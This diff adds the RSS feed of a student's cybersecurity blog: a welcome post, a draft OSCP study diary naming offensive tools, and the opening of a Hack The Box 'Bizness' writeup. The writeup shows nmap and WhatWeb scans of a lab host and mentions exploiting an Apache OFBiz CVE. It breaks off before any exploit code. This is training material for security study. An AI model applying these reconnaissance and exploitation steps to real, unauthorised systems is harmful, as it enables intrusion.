@@ -1,0 +1,1577 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on ShaanksFR Blog</title><link>https://shaanksm.github.io/post/</link><description>Recent content in Posts on ShaanksFR Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 08 Feb 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://shaanksm.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>Hello World</title><link>https://shaanksm.github.io/p/hello-world/</link><pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate><guid>https://shaanksm.github.io/p/hello-world/</guid><description>&lt;img src="https://shaanksm.github.io/p/hello-world/cover.jpg" alt="Featured image of post Hello World" />&lt;h1 id="en">EN&lt;/h1>
+&lt;p>Welcome to the enthralling realm of cybersecurity, where every line of code narrates a tale of challenges and discoveries. Ever since stepping into the halls of EPITA, an engineering school in Paris, my passion for cybersecurity has burgeoned like a flame hungry for knowledge.&lt;/p>
+&lt;p>Through this blog, I invite you to accompany me on my journey, from the status of a padawan to that of a Jedi in the expansive world of information security. Picture me as an apprentice mariner who, through writings, event participations, and shared reflections, aspires to become a fearless chief captain navigating the digital ocean.&lt;/p>
+&lt;p>While my heart lies in the web, where each vulnerability beckons exploration and fortification, I refuse to confine myself to a single playground. I actively strive to acquire cross-disciplinary skills, all the while keeping an eye on future challenges like reverse engineering and pwn, though they may not be immediate priorities.&lt;/p>
+&lt;p>Join me in this adventure where lines of code transform into virtual swords, and each step marks progress towards mastering the art of cybersecurity. May this blog serve as a testament to my learnings, successes, and failures, offering a glimpse into the ever-evolving world of the modern-day pirate, from apprentice mariner to chief captain.&lt;/p>
+&lt;h1 id="fr">FR&lt;/h1>
+&lt;p>Bienvenue dans l&amp;rsquo;univers captivant de la cybersécurité, où chaque ligne de code raconte une histoire de défis et de découvertes. Depuis mes premiers pas à l&amp;rsquo;EPITA, école d&amp;rsquo;ingénieurs à Paris, mon amour pour la cybersécurité a grandi comme une flamme avide de connaissance.&lt;/p>
+&lt;p>À travers ce blog, je partage avec vous mon périple, du statut de padawan à celui de Jedi dans le vaste monde de la sécurité informatique. Imaginez-moi comme un apprenti marin qui, au fil des écrits, des participations à des événements et des réflexions partagées, aspire à devenir un chef capitaine intrépide dans l&amp;rsquo;océan numérique.&lt;/p>
+&lt;p>Mon domaine de prédilection réside dans le web, où chaque vulnérabilité est une invitation à explorer et à renforcer la sécurité. Je m&amp;rsquo;efforce d&amp;rsquo;acquérir des compétences transversales, tout en gardant un œil sur des défis futurs tels que la crypto par exemple, même si ces derniers ne sont pas ma priorité immédiate.&lt;/p>
+&lt;p>Rejoignez-moi dans cette aventure où les lignes de code deviennent des épées virtuelles et où chaque étape marque un pas de plus vers la maîtrise de l&amp;rsquo;art de la cybersécurité. Que ce blog soit le témoignage de mes apprentissages, de mes succès et de mes échecs, tout en offrant une fenêtre sur le monde en constante évolution du pirate moderne, de l&amp;rsquo;apprenti marin au chef capitaine.&lt;/p></description></item><item><title>My (ongoing) OSCP Jouney !</title><link>https://shaanksm.github.io/p/certification/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://shaanksm.github.io/p/certification/</guid><description>&lt;img src="https://shaanksm.github.io/p/certification/offsec.png" alt="Featured image of post My (ongoing) OSCP Jouney !" />&lt;p>Greetings, pal! I&amp;rsquo;m Shaanks, holder of a Master&amp;rsquo;s Degree in EPITA (Computer Engineer School) with 3 years of &amp;ldquo;alternance&amp;rdquo; (alternating half time school-company - french system), and I&amp;rsquo;m eager to recount my experiences with you.
+Here&amp;rsquo;s the lowdown: This marks the inception of my inaugural blog, and I&amp;rsquo;m delighted to commence it with the narrative of my triumphant journey through the OSCP (Offensive Security Certified Professional) certification.&lt;/p>
+&lt;p>I&amp;rsquo;ve been immersing myself in the captivating realm of cybersecurity solo for approximately some years. And the thrilling part? I (will) conquered the OSCP, so why don&amp;rsquo;t write my rush board ?&lt;/p>
+&lt;p>A Journey of Cyber-Excitement 🤪 &amp;raquo;&lt;/p>
+&lt;p>Let me tell you, the OSCP exam isn&amp;rsquo;t a leisurely stroll in the tech park; it&amp;rsquo;s more like a roller coaster in the land of hackers, filled with twists and turns involving breaking into systems and assuming the role of a digital hero. While some may take an eternity to prepare, I opted to expedite my journey.\&lt;/p>
+&lt;ul>
+&lt;li>Note that OSCP is not necessarily web to get your first foothold, as there is (perhaps) some buffer over flow (BOF).&lt;br>
+&lt;em>this certification isn&amp;rsquo;t the easiest, but it&amp;rsquo;s &lt;em>&lt;strong>not the hardest&lt;/strong>&lt;/em> either&lt;/em>&lt;/li>
+&lt;/ul>
+&lt;h3 id="back-to-the-educational-arena">Back to the Educational Arena:&lt;/h3>
+&lt;p>I initiated my expedition by enrolling in an official course provided by Offensive Security (&lt;a class="link" href="https://www.offsec.com/" target="_blank" rel="noopener"
+>https://www.offsec.com/&lt;/a>) , the very architects of the OSCP exam. &lt;br>
+Their website, Offensive Security, became my primary reservoir of knowledge.&lt;/p>
+&lt;p>This course served as my golden ticket, unlocking the enigmas of the exam. It laid the crucial foundation and furnished me with the fundamental knowledge essential to tackle the more intricate challenges that lay ahead.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/certification/portal.png"
+width="1897"
+height="772"
+srcset="https://shaanksm.github.io/p/certification/portal_hu86249b7e6270d0667e1b9fb676401572_107770_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/certification/portal_hu86249b7e6270d0667e1b9fb676401572_107770_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Macro view of material content"
+class="gallery-image"
+data-flex-grow="245"
+data-flex-basis="589px"
+>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/certification/chall.png"
+width="701"
+height="671"
+srcset="https://shaanksm.github.io/p/certification/chall_hu0b9dacc5dd84c2c37301988ba37179be_111064_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/certification/chall_hu0b9dacc5dd84c2c37301988ba37179be_111064_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Material Challenge Lab"
+class="gallery-image"
+data-flex-grow="104"
+data-flex-basis="250px"
+>&lt;/p>
+&lt;h1 id="whats-included-with-registration">What&amp;rsquo;s Included with Registration:&lt;/h1>
+&lt;p>Upon enrolling in the course, you will gain access to the comprehensive OSCP study materials and a 3-month lab subscription. This package encompasses downloadable resources like videos and PDFs for your learning and future reference.&lt;/p>
+&lt;p>The labs consist of 6 machines; in my perspective, 3 of them pose a greater challenge than the OSCP exam, while the remaining 3 closely mirror the exam&amp;rsquo;s configuration, albeit with slightly distinct methodologies.&lt;/p>
+&lt;h3 id="exam-structure-and-strategy-">Exam Structure and Strategy :&lt;/h3>
+&lt;p>The exam structure is as follows:&lt;/p>
+&lt;p>To succeed in the OSCP exam, you must navigate through a structured evaluation. The exam comprises one Active Directory Domain, accounting for 40 points, and three standalone machines, each carrying a value of 20 points. &lt;br>
+Within these machines, 10 points are allocated for the low privilege &amp;rsquo;local.txt&amp;rsquo; and an additional 10 points for the root/Administrator &amp;lsquo;proof.txt&amp;rsquo;. To meet the passing criteria, your main objective is to successfully conquer the Active Directory and at least one standalone machine, thereby earning an additional 10 Bonus Points.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/certification/scenario.png"
+width="1480"
+height="504"
+srcset="https://shaanksm.github.io/p/certification/scenario_hu17ca57281295f45120f179e920914d5f_293346_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/certification/scenario_hu17ca57281295f45120f179e920914d5f_293346_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="293"
+data-flex-basis="704px"
+>&lt;/p>
+&lt;h3 id="resources-utilized">Resources Utilized:&lt;/h3>
+&lt;p>(Currently) I invested in a Hack The Box VIP membership and successfully tackled approximately 30 machines—3 Windows and 27 Linux. &lt;br>
+Whenever I encountered challenges in solving a specific machine, I sought guidance from IppSec&amp;rsquo;s walkthrough videos. &lt;br>
+Even after independently solving a machine, I made it a routine to watch IppSec&amp;rsquo;s demonstrations and explanations, enhancing my comprehension and acquiring new methodologies. &lt;br>
+Regularly integrating IppSec&amp;rsquo;s walkthrough videos into my routine, I chose to utilize my pre-sleep time for educational purposes, opting for valuable insights and knowledge from IppSec&amp;rsquo;s machine-solving sessions instead of scrolling through TikTok or consuming less educational content.&lt;/p>
+&lt;h3 id="essential-resources-for-success">Essential Resources for Success:&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>OSCP Material and Challenge Labs (logic..)&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>HACK THE BOX&lt;br>
+&lt;em>HTB&amp;rsquo;s medium machines are about the same level as OSCP, sometimes even harder.&lt;/em>
+&lt;a class="link" href="https://app.hackthebox.com/starting-point" target="_blank" rel="noopener"
+>https://app.hackthebox.com/starting-point&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>IPPSEC : &lt;a class="link" href="https://www.youtube.com/@ippsec" target="_blank" rel="noopener"
+>https://www.youtube.com/@ippsec&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Tib3rius : &lt;a class="link" href="https://www.youtube.com/@Tib3rius" target="_blank" rel="noopener"
+>https://www.youtube.com/@Tib3rius&lt;/a>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="my-exam-current-toolkit">My Exam (&amp;lsquo;current&amp;rsquo;) Toolkit:&lt;/h3>
+&lt;p>Prior to the exam, I configured a new Kali Linux virtual machine, installing all the necessary tools anticipated for the exam (Later i&amp;rsquo;ld like to configure my own pentest environnement from a Mac OS for exemple of Ubuntu).&lt;/p>
+&lt;p>This toolkit included utilities like Ligolo (You can find my explanation of the Ligolo tool above), &lt;br>
+Impacket tools (Mandatory for Windows environnment), &lt;br>
+Autorecon (thx Tib3rius) &lt;br>
+Mimikatz, and others. As a precaution, I captured a screenshot of my setup, ensuring readiness in case any issues arose with the VM during the exam.&lt;/p>
+&lt;h4 id="ligolo-ng">Ligolo-ng:&lt;/h4>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/certification/pivot.png"
+width="451"
+height="214"
+srcset="https://shaanksm.github.io/p/certification/pivot_hucd1074605ad0e2ef70c251832da073ea_155112_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/certification/pivot_hucd1074605ad0e2ef70c251832da073ea_155112_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Pivoting illustration"
+class="gallery-image"
+data-flex-grow="210"
+data-flex-basis="505px"
+>&lt;/p>
+&lt;p>Before delving back into the blog, let&amp;rsquo;s take a moment to discuss Ligolo. Ligolo is an invaluable tool for pivoting and tunneling, streamlining the process by creating a tunnel similar to a VPN. With Ligolo, ther there&amp;rsquo;s no need for additional tools like proxy chains to perform attacks on the target. &lt;br>
+Its simplicity and effectiveness proved to be immensely helpful during my exam, and I&amp;rsquo;m confident it can be of assistance to you as well. &lt;br>
+I plan to create a comprehensive demonstration on effectively using Ligolo, showcasing not just double, but triple and even quadruple pivoting with it.&lt;/p>
+&lt;p>&lt;a class="link" href="https://github.com/nicocha30/ligolo-ng" target="_blank" rel="noopener"
+>https://github.com/nicocha30/ligolo-ng&lt;/a>&lt;/p>
+&lt;p>John Hammond :https://www.youtube.com/watch?v=qou7shRlX_s&lt;/p>
+&lt;h4 id="perseverance">Perseverance:&lt;/h4>
+&lt;p>Now, let&amp;rsquo;s address the most crucial aspect: perseverance. It&amp;rsquo;s imperative that you never, and I mean never, give up—before, during, or even after the exam, regardless of the outcome. The OSCP exam itself may not be inherently difficult, and what often leads to people failing is not the exam&amp;rsquo;s complexity but rather their mindset and psychological preparedness. Success hinges on how you approach and maintain determination throughout the exam.&lt;/p>
+&lt;h3 id="board-diary-">Board Diary :&lt;/h3>
+&lt;h4 id="week1-2-">Week1-2 :&lt;/h4>
+&lt;p>I&amp;rsquo;ve completed 40% of the course material, and my aim is to finish 80% of the exercises within the next 30 days, if not sooner. This will leave me with a full 60 days to tackle as many machines as possible, excluding HTB machines.&lt;/p>
+&lt;p>Considering there are approximately 30 machines on HTB and none on the Offsec platform on my case, it would be beneficial to aim for at least 30 machines on Offsec and around 70 on Hack The Box, including both Linux and Windows machines rated as easy and medium difficulty.&lt;/p>
+&lt;p>In the meantime, I&amp;rsquo;m actively job hunting as I&amp;rsquo;ve been unemployed since the end of my sandwich course, and it&amp;rsquo;s already February 2024, so I sometimes take breaks to apply&lt;/p>
+&lt;p>I initially started with the SQLI course, expecting it to be easier than it turned out to be. &lt;br>
+Unfortunately, after spending nearly 5 hours and 45 minutes on the same exercise, I found myself with a sore back and tired eyes. While I know I should take breaks, once I&amp;rsquo;m immersed in a task, it&amp;rsquo;s hard for me to step away.&lt;/p>
+&lt;h4 id="week-2-3-">Week 2-3 :&lt;/h4>
+&lt;h3 id="result-month-1-">Result Month 1 :&lt;/h3>
+&lt;h3 id="the-exam-day">The Exam Day:&lt;/h3>
+&lt;p>Im not yet but hope soon !
+(Already planned)&lt;/p>
+&lt;h3 id="the-result">The result&lt;/h3>
+&lt;p>draft : Result &amp;amp; feel + tips at at exam day (sleep, eat, ect)&lt;/p>
+&lt;h3 id="whats-next-">What&amp;rsquo;s next ?&lt;/h3>
+&lt;p>draft : (next certification goal / next target)&lt;/p></description></item><item><title>Bizness Writeup</title><link>https://shaanksm.github.io/p/bizness-writeup/</link><pubDate>Wed, 24 Jan 2024 00:00:00 +0000</pubDate><guid>https://shaanksm.github.io/p/bizness-writeup/</guid><description>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/cover.png" alt="Featured image of post Bizness Writeup" />&lt;h1 id="bizness-htb---writeup">BIZNESS HTB - WRITEUP&lt;/h1>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/cover.png"
+width="1123"
+height="403"
+srcset="https://shaanksm.github.io/p/bizness-writeup/cover_huaea1c6500f5f6ef73de368cd5cb02c59_88074_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/cover_huaea1c6500f5f6ef73de368cd5cb02c59_88074_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="introduction"
+class="gallery-image"
+data-flex-grow="278"
+data-flex-basis="668px"
+>&lt;/p>
+&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;p>&amp;quot; Bizness&amp;quot;, released on January 6, 2024, is a challenging machine on Hack The Box. It highlights a critical CVE in Apache OFBiz, allowing for command injection and potential Remote Code Execution (RCE), along with a pathway for Server-Side Request Forgery (SSRF). The machine extends its complexity by requiring participants to navigate through diverse folders, extract spear information, and employ configuration analysis to crack passwords for privilege escalation. Engaging with &amp;ldquo;Bizness&amp;rdquo; offers a hands-on experience in identifying and exploiting vulnerabilities while emphasizing the importance of effective privilege escalation techniques.&lt;/p>
+&lt;h2 id="matrix">Matrix&lt;/h2>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/matrix.png"
+width="441"
+height="451"
+srcset="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/matrix_hu05d9d93fe7860588f2047608ba5eba39_34031_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/matrix_hu05d9d93fe7860588f2047608ba5eba39_34031_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Matrix&amp;rsquo;s Box"
+class="gallery-image"
+data-flex-grow="97"
+data-flex-basis="234px"
+>&lt;/p>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;p>I kick off the process by enumerating ports using AutoRecon(Tool only for CTF environnemnt).&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># ┌──(shnks㉿shnks)-[~]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ nmap -A -T4 bizness.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-25 00:54 CET
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report for bizness.htb (10.10.11.252)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up (0.018s latency).
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: 997 closed tcp ports (conn-refused)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ 256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http nginx 1.18.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-server-header: nginx/1.18.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-title: Did not follow redirect to https://bizness.htb/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">443/tcp open ssl/http nginx 1.18.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-title: BizNess Incorporated
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid before: 2023-12-14T20:03:40
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_Not valid after: 2328-11-10T20:03:40
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| tls-alpn:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ http/1.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-server-header: nginx/1.18.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ssl-date: TLS randomness does not represent time
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| tls-nextprotoneg:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ http/1.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap done: 1 IP address (1 host up) scanned in 17.80 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Leveraging this phase, I meticulously list directories and explore the site concurrently with the scan.
+It&amp;rsquo;s during this exploration that I pinpoint the &amp;ldquo;accounting&amp;rdquo; directory, which appears to be the most promising starting point.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc1.png"
+width="958"
+height="763"
+srcset="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc1_hud081570df7d56706cfa1a228282c2700_167820_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc1_hud081570df7d56706cfa1a228282c2700_167820_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Dirsearch enumeration"
+class="gallery-image"
+data-flex-grow="125"
+data-flex-basis="301px"
+>&lt;/p>
+&lt;p>Upon closer examination, I stumble upon an authentication page utilizing the Apache OFBiz framework, with a version susceptible to two CVEs. &lt;br>
+The one that catches my eye is &lt;em>&lt;strong>CVE-2023-51467&lt;/strong>&lt;/em>, which I exploit to secure an initial foothold on the server.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/webofbiz.png"
+width="1911"
+height="693"
+srcset="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/webofbiz_hu81d6967eaaaadf4894a5c1fa5f5b1247_68652_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/webofbiz_hu81d6967eaaaadf4894a5c1fa5f5b1247_68652_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Web page Apache"
+class="gallery-image"
+data-flex-grow="275"
+data-flex-basis="661px"
+>&lt;/p>
+&lt;p>Bellow the result&amp;rsquo;s whatweb&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;span class="lnt">68
+&lt;/span>&lt;span class="lnt">69
+&lt;/span>&lt;span class="lnt">70
+&lt;/span>&lt;span class="lnt">71
+&lt;/span>&lt;span class="lnt">72
+&lt;/span>&lt;span class="lnt">73
+&lt;/span>&lt;span class="lnt">74
+&lt;/span>&lt;span class="lnt">75
+&lt;/span>&lt;span class="lnt">76
+&lt;/span>&lt;span class="lnt">77
+&lt;/span>&lt;span class="lnt">78
+&lt;/span>&lt;span class="lnt">79
+&lt;/span>&lt;span class="lnt">80
+&lt;/span>&lt;span class="lnt">81
+&lt;/span>&lt;span class="lnt">82
+&lt;/span>&lt;span class="lnt">83
+&lt;/span>&lt;span class="lnt">84
+&lt;/span>&lt;span class="lnt">85
+&lt;/span>&lt;span class="lnt">86
+&lt;/span>&lt;span class="lnt">87
+&lt;/span>&lt;span class="lnt">88
+&lt;/span>&lt;span class="lnt">89
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">WhatWeb&lt;/span> &lt;span class="n">report&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">bizness&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">htb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">443&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Status&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="mi">200&lt;/span> &lt;span class="n">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Title&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">BizNess&lt;/span> &lt;span class="n">Incorporated&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="ne">IP&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="mf">10.10&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">11.252&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Country&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">RESERVED&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ZZ&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Summary&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">Bootstrap&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Cookies&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">JSESSIONID&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">Email&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">bizness&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">htb&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">HTML5&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HTTPServer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">nginx&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.18&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">HttpOnly&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">JSESSIONID&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">JQuery&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Lightbox&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nginx&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mf">1.18&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="ne">Script&lt;/span>
